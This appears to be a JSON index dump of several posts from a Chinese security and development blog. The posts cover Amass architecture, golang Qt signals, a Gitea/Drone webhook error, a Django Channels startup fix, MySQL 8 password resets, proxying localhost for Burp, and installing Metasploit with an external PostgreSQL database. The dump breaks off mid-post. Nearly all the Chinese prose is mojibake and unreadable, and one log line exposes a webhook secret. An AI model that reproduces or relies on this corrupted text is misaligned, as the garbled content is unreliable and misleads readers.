é’ˆå¯¹é—®é¢˜1ï¼Œ Amass é‡‡ç”¨çš„è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨ä¸€ä¸ªåç¨‹æ¥ç›‘æ§dnsè¯·æ±‚çš„é€Ÿç‡ï¼Œå‡å¦‚å¤šå°‘ç§’ä¸æ´»è·ƒï¼ˆå³æ— æ–°æ•°æ®ï¼‰ï¼Œå¹¶ä¸”æ¯ç§’ dns è¯·æ±‚å°äºå‡ ä¸ªï¼Œå³åˆ¤æ–­ä¸ºç»“æŸï¼Œè¿™ä¸ªæ–¹æ¡ˆåªèƒ½è¯´æ˜¯ä¸€ä¸ªç›¸å¯¹å¥½ç”¨çš„è§£å†³æ‰‹æ®µï¼Œå› ä¸ºæ¶æ„çš„é—®é¢˜å¯¼è‡´æœ¬èº«å°±å¾ˆéš¾ä»¥å»åˆ¤æ–­ç»“æŸ\né’ˆå¯¹é—®é¢˜2ï¼Œå¯èƒ½å¼€å‘è€…æƒ³è®©æ•´ä¸ªé¡¹ç›®çš„æ•°æ®æµåŠ¨æ›´æ¸…æ™°ä¸€äº›ï¼Œæ‰€ä»¥é‡‡ç”¨äº† pipelineæ¨¡å¼ï¼Œç„¶åä½¿ç”¨æ‰‡å…¥æ‰‡å‡ºåŠ å¿«æ•´ä¸ªå¤„ç†æµç¨‹\næ”¹ç‰ˆå è®¾ç½®äº†ä¸€æ¡æ¶ˆæ¯æ€»çº¿ï¼Œå…¶ä¸­å®šä¹‰äº†ä¸¤ä¸ªè·¯ç”±ï¼šnewnameï¼ˆå­åŸŸåï¼‰å’Œnewaddrï¼ˆipåœ°å€ï¼‰ï¼Œå…¶ä»–çš„è·¯ç”±æ¯”å¦‚æ—¥å¿—æˆ‘ä»¬æš‚æ—¶ä¸ç”¨å…³å¿ƒï¼Œè¿™ä¸¤ä¸ªè·¯ç”±æ‰€å¯¹æ¥çš„æ˜¯æ•°æ®æºæœåŠ¡æ’ä»¶ï¼ˆåŒ…å«å°éƒ¨åˆ†golangæ’ä»¶ï¼Œå¤§éƒ¨åˆ†luaæ’ä»¶ï¼‰ï¼Œé€šè¿‡æ•°æ®æºæ¥äº§ç”Ÿæ–°å­åŸŸï¼Œå‘å¸ƒåˆ°æ€»çº¿ä¸­ï¼Œç„¶åè¿™ä¸¤ä¸ªè·¯ç”±æ‰€æ³¨å†Œçš„è®¢é˜…å¤„ç†å‡½æ•°çš„åŠŸèƒ½æ˜¯æŠŠæ•°æ®é‡å®šå‘åˆ° pipeline çš„èµ·ç‚¹ï¼Œpipelineçš„æ•°æ®å¤„ç†é€šè¿‡é¢„å…ˆè®¾ç½®å¥½çš„å‡ ä¸ªé˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µå¯ä»¥æ ¹æ®ä¸ªäººçš„éœ€æ±‚æ§åˆ¶å¹¶å‘æ•°\nå…¶ä¸­æ€»çº¿çš„æ‰€æœ‰çš„æ–°æ•°æ®ä¼šè¿›å…¥sourceï¼Œç„¶ååé¢çš„stageéƒ½æ˜¯å¯ä»¥åŠ¨æ€æ‰©å®¹çš„ï¼Œæœ€åæ•°æ®ç»è¿‡ä¸€ä¸ªä¸€ä¸ªé˜¶æ®µçš„å¤„ç†ï¼Œæœ€ååˆ°è¾¾sinkã€‚\né€šè¿‡ pipelineï¼ŒæŠŠæ•´ä¸ªæµç¨‹æ¸…æ™°åŒ–äº†èµ·æ¥ã€‚\nä¸€ç‚¹çŒœæƒ³ ç›®å‰è¿˜ä¿æœ‰ golang çš„æ’ä»¶ï¼Œä½†æ˜¯ç›®å‰çœ‹èµ·æ¥ golang çš„æ’ä»¶æ˜¯å¯ä»¥ç”¨ lua å»å®ç°çš„ï¼Œæ‰€ä»¥ç›®å‰æ¥çœ‹åº”è¯¥æ˜¯è¿˜æ²¡æœ‰è¿ç§»å®Œæ¯•ã€‚\nç›®å‰æ‰€ä½¿ç”¨çš„ pipeline åº“ä¹Ÿæ˜¯ Amass é¡¹ç›®è´Ÿè´£äºº Jeff Foley å†™çš„ï¼Œå…¶ä¸­å¤§è‡´ä¸Šæœ‰è¿™ä¹ˆå‡ ä¸ªåŠŸèƒ½ï¼š\nå…¥å£å¤„ç† å‡ºå£å¤„ç† é˜¶æ®µå¤„ç† å›ºå®šåç¨‹æ•°é‡çš„åç¨‹æ± ï¼ˆå•ä¸€ä»»åŠ¡ï¼‰ åŠ¨æ€åç¨‹æ•°é‡å¹¶å¯è®¾ç½®ä¸Šé™çš„åç¨‹æ± ï¼ˆå•ä¸€ä»»åŠ¡ï¼‰ å•ç®¡é“ï¼ˆå•ä¸€ä»»åŠ¡ï¼‰ å¹¿æ’­ï¼ˆå¤šä»»åŠ¡ï¼Œä¸ç­‰å¾…è¯¥é˜¶æ®µæ‰€æœ‰ä»»åŠ¡å®Œæˆï¼Œæœ‰ä»»åŠ¡å®Œæˆå³è¿›å…¥ä¸‹ä¸€é˜¶æ®µï¼‰ å¹³è¡Œï¼ˆå¤šä»»åŠ¡ï¼Œç­‰å¾…è¯¥é˜¶æ®µæ‰€æœ‰ä»»åŠ¡å®Œæˆå†è¿›å…¥ä¸‹ä¸€é˜¶æ®µï¼‰ ç›®å‰æ¥çœ‹çš„è¯ï¼Œå¹¿æ’­å’Œå¹³è¡Œéƒ½æ²¡æœ‰éƒ½æ²¡æœ‰ç”¨åˆ°ï¼Œå…¶å®æ¯”è¾ƒå›°æƒ‘çš„ä¸€ç‚¹æ˜¯ï¼Œæ•´ä¸ªæµæ°´çº¿æ¨¡å¼æ˜¯å¯ä»¥åº”å¯¹å­åŸŸåæ”¶é›†çš„ï¼Œä½†æ˜¯ç›®å‰è¿˜æ˜¯ä¿ç•™æœ‰æ€»çº¿çš„æ¦‚å¿µï¼ŒçŒœæµ‹å¯èƒ½åé¢ä¼šä½¿ç”¨å¹¿æ’­æˆ–å¹³è¡Œå¯¹æ•°æ®æºçš„æ’ä»¶è¿›è¡Œæ‰§è¡Œï¼Œå› ä¸ºæ¯ä¸ªæ’ä»¶å¯ä»¥çœ‹ä½œä¸€ä¸ª Taskï¼Œæ°å¥½æ˜¯æ»¡è¶³ä»–è‡ªå·±çš„è®¾è®¡çš„\n","permalink":"https://www.hacktech.cn/post/amass-source-code-read-arch-desc.html","summary":"\u003cp\u003eæœ¬æ–‡å†™äº \u003ca href=\"https://github.com/OWASP/Amass/tree/v3.11.2\"\u003eAmass v3.11.2\u003c/a\u003eï¼Œå¯èƒ½åç»­æœ‰è¿‡æ›´å¤šå˜æ›´ï¼Œä½†æ˜¯åº”è¯¥æ•´ä½“é€»è¾‘ä¸ä¼šæœ‰ååˆ†å¤§çš„å˜åŠ¨äº†\u003c/p\u003e","title":"Amassé¡¹ç›®æºç é˜…è¯»(æ•´ä½“æ¶æ„)"},{"content":"è¿™ç¯‡æ–‡ç« ä¸»è¦è®°å½•golang qtä½¿ç”¨ä¸­çš„è‡ªå®šä¹‰Objectæ€ä¹ˆç¼–å†™ä»¥åŠsingalä½¿ç”¨\nwk.go 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package wk import ( \u0026#34;fmt\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;github.com/therecipe/qt/core\u0026#34; \u0026#34;github.com/therecipe/qt/gui\u0026#34; \u0026#34;github.com/therecipe/qt/network\u0026#34; \u0026#34;github.com/therecipe/qt/webkit\u0026#34; ) // ScreenshotConfig screenshot config type ScreenshotConfig struct { ID string URL string Width int Height int Quality int Format string UA string } // ScreenshotObject qt object type ScreenshotObject struct { core.QObject _ func(config ScreenshotConfig) `signal:\u0026#34;startScreenshot,auto\u0026#34;` _ func(id string, data []byte) `signal:\u0026#34;finishScreenshot,auto\u0026#34;` Map sync.Map } // StartScreenshot start screenshot slots func (s *ScreenshotObject) startScreenshot(config ScreenshotConfig) { s.GetScreenshot(config) } // FinishScreenshot finish screenshot slots and store data to map func (s *ScreenshotObject) finishScreenshot(id string, data []byte) { s.Map.Store(id, data) } // GetScreenshot get a snapshot for website func (s *ScreenshotObject) GetScreenshot(config ScreenshotConfig) { ... page.MainFrame().Load(qURL) page.ConnectLoadFinished(func(bool) { ... s.FinishScreenshot(config.ID, data) fmt.Println(data) }) } main.go 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package main import ( \u0026#34;os\u0026#34; \u0026#34;github.com/akkuman/webkit-screenshot/wk\u0026#34; \u0026#34;github.com/therecipe/qt/widgets\u0026#34; ) func main() { os.Setenv(\u0026#34;QT_QPA_PLATFORM\u0026#34;, \u0026#34;offscreen\u0026#34;) app := widgets.NewQApplication(len(os.Args), os.Args) screenshotObj := wk.NewScreenshotObject(nil) go screenshot(screenshotObj, \u0026#34;https://www.baidu.com\u0026#34;) app.Exec() } func screenshot(obj *wk.ScreenshotObject, url string) { config := wk.ScreenshotConfig{ ID: \u0026#34;xxxx\u0026#34;, URL: url, Width: 1920, Height: 1080, Quality: 50, Format: \u0026#34;jpg\u0026#34;, UA: \u0026#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\u0026#34;, } obj.StartScreenshot(config) } çœ‹åˆ°ä¸Šé¢ä¸¤æ®µä»£ç æˆªå–ï¼Œgolang qté‡Œé¢ä½¿ç”¨ Connect[singalName] è¿æ¥ singalï¼Œåœ¨struct tagä¸­åŠ ä¸Šautoä»£è¡¨å¯ä»¥æŠŠè¯¥ç»“æ„ä½“æ–¹æ³•åŒåçš„æ–¹æ³•è‡ªåŠ¨Connectä¸Šå»ã€‚\nè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œauto çš„æ–¹æ³•åä¸è¦é¦–å­—æ¯å¤§å†™ï¼Œä¼šä¸ qtmoc è‡ªåŠ¨ç”Ÿæˆçš„æœ‰å†²çªã€‚\nè¯¥ç¨‹åºçš„ç›®çš„æ˜¯éœ€è¦åœ¨å¤–éƒ¨é€šè¿‡ goroutine è°ƒç”¨ç»„ä»¶è¿›è¡Œä¸€ç³»åˆ—æ–¹æ³•ã€‚\nè¿™é‡Œéœ€è¦ååˆ†æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œqt ç»„ä»¶å¿…é¡»åœ¨ qt ç¨‹åºä¸»æ¶ˆæ¯å¾ªç¯ä¸­åˆ›å»ºï¼Œä¸èƒ½åœ¨ goroutine ä¸­åˆ›å»ºï¼Œå¦åˆ™æ ·ä¾‹ä¸­çš„ page.ConnectLoadFinished å°†ä¸ä¼šè¢«æ‰§è¡Œã€‚\næ‹¿è¿™ä¸ªä¾‹å­æ¥è¯´ï¼Œå°±æ˜¯ screenshotObj := wk.NewScreenshotObject(nil) å¿…é¡»åœ¨ä¸»çº¿ç¨‹ä¸­ï¼Œè€Œä¸èƒ½ç”¨ goroutine æ‰§è¡Œã€‚\n","permalink":"https://www.hacktech.cn/post/golang-qt-custom-object-trap.html","summary":"\u003cp\u003eè¿™ç¯‡æ–‡ç« ä¸»è¦è®°å½•golang qtä½¿ç”¨ä¸­çš„è‡ªå®šä¹‰Objectæ€ä¹ˆç¼–å†™ä»¥åŠsingalä½¿ç”¨\u003c/p\u003e","title":"golang qtä¸­çš„è‡ªå®šä¹‰Object"},{"content":"æˆ‘ä»¬çŸ¥é“åœ¨Droneä¸­æ¿€æ´»giteaä»“åº“åä¼šåœ¨è¯¥ä»“åº“ä¸‹ç”Ÿæˆä¸€ä¸ªwebhookï¼Œä½†æ˜¯å½“æˆ‘ä»¬æ¨é€æ—¶å´æ— äº‹å‘ç”Ÿï¼Œæµ‹è¯•æ¨é€æ—¶å‡ºç°é”™è¯¯\n1 Delivery: Post \u0026#34;http://ci.test.com/hook?secret=zMIxs0On0e7FOpgt6RImNrlgD6Bu4OQr\u0026#34;: read tcp 172.27.0.3:56812-\u0026gt;10.20.156.4:80: i/o timeout è¯¥é”™è¯¯æœ‰ä¸¤ç§åŸå› \nè¶…æ—¶è¿‡çŸ­ Droneæ— æ³•è®¿é—®åˆ°è¯¥ä»“åº“çš„ .drone.yml æ–‡ä»¶ é’ˆå¯¹ç¬¬ä¸€ç§é—®é¢˜ï¼Œä¸€èˆ¬æ˜¯ç»™ gitea å¢åŠ  DELIVER_TIMEOUT å³å¯\né’ˆå¯¹ç¬¬äºŒä¸ªé—®é¢˜ï¼Œå¯èƒ½åˆ†ä¸ºä¸¤ç§å‡ ç§æƒ…å†µ\nä»“åº“ä¸­æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªç›´æ¥åœ¨ä»“åº“ä¸­åˆ›å»ºä¸€ä¸ªå³å¯ ä»“åº“ä¸­æœ‰è¿™ä¸ªæ–‡ä»¶ä½†æ˜¯è®¿é—®ä¸åˆ°ï¼Œå¯èƒ½æ˜¯ä½ çš„ nginx è®¾ç½®äº†ç­–ç•¥ï¼Œä»¥ . å¼€å¤´çš„æ–‡ä»¶æ— æ³•è®¿é—® è§£å†³æ–¹æ¡ˆï¼š åˆ é™¤æ‰ nginx é…ç½®ä¸­ç±»ä¼¼äºä¸‹é¢çš„ç­–ç•¥\n1 2 3 location ~ /\\.(?!well-known) { deny all; } è¯¥ç­–ç•¥çš„ä½œç”¨æ˜¯å½“ç”¨æˆ·è®¿é—®ä»¥ . å¼€å¤´çš„æ–‡ä»¶åˆ™è¿”å›403\n","permalink":"https://www.hacktech.cn/post/gitea-drone-webhook-error.html","summary":"\u003cp\u003eæˆ‘ä»¬çŸ¥é“åœ¨Droneä¸­æ¿€æ´»giteaä»“åº“åä¼šåœ¨è¯¥ä»“åº“ä¸‹ç”Ÿæˆä¸€ä¸ªwebhookï¼Œä½†æ˜¯å½“æˆ‘ä»¬æ¨é€æ—¶å´æ— äº‹å‘ç”Ÿï¼Œæµ‹è¯•æ¨é€æ—¶å‡ºç°é”™è¯¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDelivery: Post \u0026#34;http://ci.test.com/hook?secret=zMIxs0On0e7FOpgt6RImNrlgD6Bu4OQr\u0026#34;: read tcp 172.27.0.3:56812-\u0026gt;10.20.156.4:80: i/o timeout\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e","title":"gitea drone webhookè§¦å‘å¤±è´¥"},{"content":"Django åœ¨ä½¿ç”¨ Channels 3 æ—¶ï¼Œä½¿ç”¨ Daphne æˆ–è€… Uvicorn å¯åŠ¨ä¼šå‡ºç° AppRegistryNotReady é”™è¯¯\nè¿™ä¸ªä¸»è¦çš„åŸå› æ˜¯åœ¨é¡¹ç›®å¯åŠ¨å‰æœªåˆå§‹åŒ–ï¼Œæˆ‘å°è¯•è‡ªè¡Œè§£å†³äº†ä¸€ä¸‹\nå¦‚æœä½ çš„ asgi.py æ˜¯å¦‚ä¸‹å½¢å¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026#34;\u0026#34;\u0026#34; ASGI config for homados project. It exposes the ASGI callable as a module-level variable named ``application``. For more information on this file, see https://docs.djangoproject.com/en/3.1/howto/deployment/asgi/ \u0026#34;\u0026#34;\u0026#34; import os from channels.routing import ProtocolTypeRouter from django.core.asgi import get_asgi_application from homados.middleware.wsmw import QueryXTokenAuthMiddleware from channels.routing import ProtocolTypeRouter, URLRouter import apps.duplex.routing import apps.synergy.routing os.environ.setdefault(\u0026#39;DJANGO_SETTINGS_MODULE\u0026#39;, \u0026#39;homados.settings.dev_micro\u0026#39;) application = ProtocolTypeRouter({ \u0026#34;http\u0026#34;: get_asgi_application(), # Just HTTP for now. (We can add other protocols later.) \u0026#39;websocket\u0026#39;: QueryXTokenAuthMiddleware( URLRouter( apps.duplex.routing.websocket_urlpatterns + apps.synergy.routing.websocket_urlpatterns ) ), }) é‚£ä¹ˆåº”è¯¥æ˜¯ä¼šæŠ¥å¦å¤–ä¸€ä¸ªé”™è¯¯ï¼Œåœ¨é¡¹ç›®è®¾ç½® DJANGO_SETTINGS_MODULE å‰è°ƒç”¨settingsï¼Œè¿™ä¸ªé”™è¯¯åªéœ€è¦æŠŠè®¾ç½®ç¯å¢ƒå˜é‡å‰æå³å¯\nä½†æ˜¯å‰æåè¿˜æ˜¯ä¼šæœ‰ AppRegistryNotReady çš„é”™è¯¯ï¼Œè¿™ä¸ªé”™è¯¯æŸ¥è¯¢äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªIssue å·²ç»æå‡ºäº†è§£å†³æ–¹æ¡ˆï¼ŒåŸå› æ˜¯å› ä¸ºdjangoè¿˜æœªåˆå§‹åŒ–æ—¶è°ƒç”¨äº†channelsè·¯ç”±æ³¨å†Œï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢å½¢å¼çš„ä»£ç æ¥è§£å†³\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026#34;\u0026#34;\u0026#34; ASGI config for homados project. It exposes the ASGI callable as a module-level variable named ``application``. For more information on this file, see https://docs.djangoproject.com/en/3.1/howto/deployment/asgi/ \u0026#34;\u0026#34;\u0026#34; import os from channels.routing import ProtocolTypeRouter from django.core.asgi import get_asgi_application from channels.routing import ProtocolTypeRouter, URLRouter os.environ.setdefault(\u0026#39;DJANGO_SETTINGS_MODULE\u0026#39;, \u0026#39;homados.settings.dev_micro\u0026#39;) django_asgi_app = get_asgi_application() from homados.middleware.wsmw import QueryXTokenAuthMiddleware import apps.duplex.routing import apps.synergy.routing application = ProtocolTypeRouter({ \u0026#34;http\u0026#34;: django_asgi_app, # Just HTTP for now. (We can add other protocols later.) \u0026#39;websocket\u0026#39;: QueryXTokenAuthMiddleware( URLRouter( # msf æ‰§è¡Œç»“æœæ¨é€ apps.duplex.routing.websocket_urlpatterns + # èŠå¤©å®¤ apps.synergy.routing.websocket_urlpatterns ) ), }) ","permalink":"https://www.hacktech.cn/post/channels_daphne_uvicorn_error.html","summary":"\u003cp\u003eDjango åœ¨ä½¿ç”¨ Channels 3 æ—¶ï¼Œä½¿ç”¨ Daphne æˆ–è€… Uvicorn å¯åŠ¨ä¼šå‡ºç° AppRegistryNotReady é”™è¯¯\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªä¸»è¦çš„åŸå› æ˜¯åœ¨é¡¹ç›®å¯åŠ¨å‰æœªåˆå§‹åŒ–ï¼Œæˆ‘å°è¯•è‡ªè¡Œè§£å†³äº†ä¸€ä¸‹\u003c/p\u003e","title":"Channels 3 Daphne Uvicorn Error AppRegistryNotReady"},{"content":"è¡¨ç°ä¸ºæŒ‰ç…§å®˜æ–¹æ–‡æ¡£ https://dev.mysql.com/doc/refman/8.0/en/resetting-permissions.html ä¸­çš„è¯´æ˜ B.3.3.2.3 Resetting the Root Password: Generic Instructions æ— æ³•æˆåŠŸæ›´æ”¹\næ‰§è¡Œ ALTER USER \u0026lsquo;root\u0026rsquo;@\u0026rsquo;localhost\u0026rsquo; IDENTIFIED BY \u0026lsquo;MyNewPass\u0026rsquo;; è¿˜æ˜¯ä¸èƒ½æˆåŠŸæ›´æ”¹\nè¿›å…¥mysql docker å‘ç°ä½¿ç”¨ mysql -u root -p å°±èƒ½ç™»å½•ï¼Œä½†æ˜¯ä½¿ç”¨ mysql -h 127.0.0.1 -P 3306 -u root -p ä¸èƒ½ç™»å½•ï¼Œæ€€ç–‘æ˜¯æœ¬åœ°ç™»å½•å’Œç½‘ç»œç™»å½•é…ç½®ä¸åŒã€‚\nä½ å¯ä»¥å…ˆçœ‹çœ‹mysqlçš„userè¡¨\n1 mysql\u0026gt; select host,user,authentication_string from mysql.user; host: å…è®¸ç”¨æˆ·ç™»å½•çš„ipï¼Œ%è¡¨ç¤ºå¯ä»¥è¿œç¨‹ï¼Œlocalhostè¡¨ç¤ºæœ¬æœºï¼›\nuser:å½“å‰æ•°æ®åº“çš„ç”¨æˆ·åï¼›\næˆ‘è¿™é‡Œæ˜¯éœ€è¦è¿œç¨‹ç™»å½•çš„å¯†ç æ”¹æ‰ï¼Œæ‰€ä»¥æ‰§è¡Œ ALTER USER \u0026lsquo;root\u0026rsquo;@\u0026rsquo;%\u0026rsquo; IDENTIFIED BY \u0026lsquo;MyNewPass\u0026rsquo;; å³å¯\n","permalink":"https://www.hacktech.cn/post/mysql8-update-password-failed.html","summary":"\u003cp\u003eè¡¨ç°ä¸ºæŒ‰ç…§å®˜æ–¹æ–‡æ¡£ \u003ca href=\"https://dev.mysql.com/doc/refman/8.0/en/resetting-permissions.html\"\u003ehttps://dev.mysql.com/doc/refman/8.0/en/resetting-permissions.html\u003c/a\u003e ä¸­çš„è¯´æ˜ \u003cstrong\u003eB.3.3.2.3 Resetting the Root Password: Generic Instructions\u003c/strong\u003e æ— æ³•æˆåŠŸæ›´æ”¹\u003c/p\u003e","title":"mysql8æ›´æ–°å¯†ç ä¸æˆåŠŸ"},{"content":"æ¯”å¦‚ä½¿ç”¨burpï¼Œè®¾ç½®ä»£ç†åï¼Œå°±ç®—æŠŠ ä¸ä»£ç†çš„åœ°å€åˆ—è¡¨ ä¸­çš„å…¨éƒ¨å»æ‰ï¼Œå¦‚æœæµé‡æ˜¯åˆ°æœ¬æœºï¼Œä¾æ—§æ— æ³•ä»£ç†\nè§£å†³æ–¹æ¡ˆï¼š\nä¸ä»£ç†çš„åœ°å€åˆ—è¡¨ä¸­åŠ ä¸Š \u0026lt;-loopback\u0026gt;\næ¥æºï¼š\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=899126#c17\n","permalink":"https://www.hacktech.cn/post/chrome-switchyomega-cannot-proxy-local-machine.html","summary":"\u003cp\u003eæ¯”å¦‚ä½¿ç”¨burpï¼Œè®¾ç½®ä»£ç†åï¼Œå°±ç®—æŠŠ ä¸ä»£ç†çš„åœ°å€åˆ—è¡¨ ä¸­çš„å…¨éƒ¨å»æ‰ï¼Œå¦‚æœæµé‡æ˜¯åˆ°æœ¬æœºï¼Œä¾æ—§æ— æ³•ä»£ç†\u003c/p\u003e","title":"chrome SwitchyOmega æ— æ³•ä»£ç†æœ¬æœº"},{"content":"metasploitä¸èƒ½ä½¿ç”¨å¤–éƒ¨çš„pgsqlæ•°æ®åº“æå¾—ä¸€ç›´å¾ˆè›‹ç–¼ï¼Œè¿™ç¯‡å°è®°åªæ˜¯è®°å½•ä¸‹å¦‚ä½•ä¸€æ­¥æ­¥è®©metasploitä½¿ç”¨å¤–éƒ¨çš„pgsqlï¼Œæœ¬ç¯‡æ–‡ç« ä¸­ä½¿ç”¨pgsqlçš„docker\nå®‰è£…ruby æ­¤å¤„ä½¿ç”¨ rbenv å®‰è£… ruby\nå…‹éš†rbenvä»“åº“\n1 git clone --depth=1 https://github.com/rbenv/rbenv.git ~/.rbenv ç¼–è¯‘bashæ‰©å±•åŠ é€Ÿrbenvï¼Œå¯é€‰\n1 cd ~/.rbenv \u0026amp;\u0026amp; src/configure \u0026amp;\u0026amp; make -C src æŠŠrbenvåŠ åˆ°ç¯å¢ƒå˜é‡\n1 2 echo \u0026#39;export PATH=\u0026#34;$HOME/.rbenv/bin:$PATH\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bashrc source ~/.bashrc rbenvè®¾ç½®\n1 rbenv init # è·Ÿéšå‘½ä»¤çš„è¾“å‡ºè®¾ç½®rbenv shell å®‰è£…ruby-buildæ’ä»¶ï¼Œä¸ºäº†æ”¯æŒrbenv install å‘½ä»¤\n1 git clone https://github.com/rbenv/ruby-build.git \u0026#34;$(rbenv root)\u0026#34;/plugins/ruby-build å¦‚æœæ˜¯å›½å†…ç”¨æˆ·ï¼Œå¯ä»¥åŠ ä¸Šrbenv cacheé•œåƒ\n1 git clone https://github.com/andorchen/rbenv-china-mirror.git \u0026#34;$(rbenv root)\u0026#34;/plugins/rbenv-china-mirror æŸ¥çœ‹ metasploit å®˜æ–¹å¼€å‘ä½¿ç”¨ç‰ˆæœ¬ï¼Œhttps://github.com/rapid7/metasploit-framework/blob/master/.ruby-version\næˆ‘è¿™é‡Œçœ‹åˆ°çš„æ˜¯ 2.6.6ï¼Œå°±å®‰è£…è¿™ä¸ªç‰ˆæœ¬\n1 2 rbenv install 2.6.6 rbenv local 2.6.6 å¦‚æœä½ æ˜¯å›½å†…ç”¨æˆ·ï¼Œå¯ä»¥è®¾ç½®ä¸€äº›é•œåƒ\n1 gem sources --add https://gems.ruby-china.com/ --remove https://rubygems.org/ å®‰è£…bundlerå¹¶è®¾ç½®é•œåƒ\n1 2 3 gem install bundler bundle config mirror.https://rubygems.org https://gems.ruby-china.com å®‰è£… metasploit è¯¦ç»†å¯å‚è§ https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment\næˆ‘ä»¬å·²ç»å®‰è£…äº†rubyï¼Œç´§æ¥ç€å®‰è£…ä¾èµ–\n1 sudo apt update \u0026amp;\u0026amp; sudo apt install -y git autoconf build-essential libpcap-dev libpq-dev zlib1g-dev libsqlite3-dev å…‹éš† metasploit\n1 git clone --depth=1 https://github.com/rapid7/metasploit-framework.git å®‰è£…metasploitè¿è¡Œæ‰€éœ€çš„rubyåº“\n1 cd metasploit-framework \u0026amp;\u0026amp; bundler install è‡³æ­¤ï¼Œmetasplot å·²ç»å¯ä»¥ä½¿ç”¨\n1 ./msfconsole å¦‚æœè¿›å…¥äº† msf console è¯æ˜å·²ç»æ­£ç¡®å®‰è£…ï¼Œå¹¶ä¸”è¿è¡Œåä¼šåœ¨ä½ çš„åˆ›å»ºä¸€ä¸ª ~/.msf4 æ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªæˆ‘ä»¬åé¢ä¼šç”¨åˆ°\nè®¾ç½®metasploitä½¿ç”¨å¤–éƒ¨æ•°æ®åº“ å¯åŠ¨pgsql é¦–å…ˆå¯åŠ¨ä¸€ä¸ªpostgresql docker\nå‚è§ https://hub.docker.com/_/postgres\nè¿™é‡Œæˆ‘ç›´æ¥ä½¿ç”¨å®˜æ–¹æä¾›çš„å‘½ä»¤\n1 2 3 4 5 6 docker run -d -p 5432:5432\\ --name some-postgres \\ -e POSTGRES_PASSWORD=mysecretpassword \\ -e PGDATA=/var/lib/postgresql/data/pgdata \\ -v /custom/mount:/var/lib/postgresql/data \\ postgres æˆ–è€…ä½ å¯ä»¥ä½¿ç”¨ docker-composeï¼Œä½†æ˜¯è®°å¾—æ”¹æ‰å¯†ç å’ŒæŒ‚è½½ç›®å½•\nç„¶åæˆ‘ä»¬åˆ›å»ºä¸¤ä¸ªæ•°æ®åº“ msf å’Œ msftestï¼Œå…·ä½“æ€ä¹ˆåˆ›å»ºè¿™é‡Œä¸å±•å¼€ï¼Œå¯ä»¥ä½¿ç”¨æ•°æ®åº“ç®¡ç†å·¥å…·\né…ç½® msf æ•°æ®åº“è¿æ¥ åœ¨ ~/.msf4 æ–‡ä»¶å¤¹ä¸‹é¢åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ database.ymlï¼Œå³ ~/.msf4/database.yml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 development: \u0026amp;pgsql adapter: postgresql database: msf username: postgres password: mysecretpassword host: 127.0.0.1 port: 5432 pool: 200 production: \u0026amp;production \u0026lt;\u0026lt;: *pgsql test: \u0026lt;\u0026lt;: *pgsql database: msftest ","permalink":"https://www.hacktech.cn/post/msf-use-external-db.html","summary":"\u003cp\u003emetasploitä¸èƒ½ä½¿ç”¨å¤–éƒ¨çš„pgsqlæ•°æ®åº“æå¾—ä¸€ç›´å¾ˆè›‹ç–¼ï¼Œè¿™ç¯‡å°è®°åªæ˜¯è®°å½•ä¸‹å¦‚ä½•ä¸€æ­¥æ­¥è®©metasploitä½¿ç”¨å¤–éƒ¨çš„pgsqlï¼Œæœ¬ç¯‡æ–‡ç« ä¸­ä½¿ç”¨pgsqlçš„docker\u003c/p\u003e","title":"metasploitä½¿ç”¨å¤–éƒ¨æ•°æ®åº“ï¼ˆTODOï¼‰"},{"content":"æ„Ÿè§‰å¯èƒ½æ˜¯éœ€è¦å¯¹ connect_session æ”¹åŠ¨ä¸€ä¸‹\nåé¢æœ‰æ—¶é—´éªŒè¯ä¸€ä¸‹\nlib/msf/ui/web/driver.rb\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 